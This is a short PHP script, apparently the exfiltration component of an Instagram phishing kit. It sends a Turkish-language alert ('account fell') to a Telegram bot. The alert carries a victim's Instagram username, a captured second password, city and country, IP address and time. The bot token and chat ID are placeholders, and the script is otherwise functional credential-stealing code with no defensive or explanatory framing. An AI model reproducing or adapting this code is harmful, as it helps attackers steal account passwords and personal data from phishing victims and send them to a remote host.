<?php

$token = "0";
 
$parametre= array(
'chat_id' => "-0",
'text' => "➡️Hesap Düştü 😜\n \n😋 https://instagram.com/$username\n🔐 İkinci Şifre : $passwords\n🏁 Konum : $ulke | $sehir\n🔗 IP Adresi : $ip\n⌛️ Tarih : $cur_time",
);
$ch = curl_init();
$url = "https://api.telegram.org/bot".$token."/sendmessage";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $parametre);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
  
?>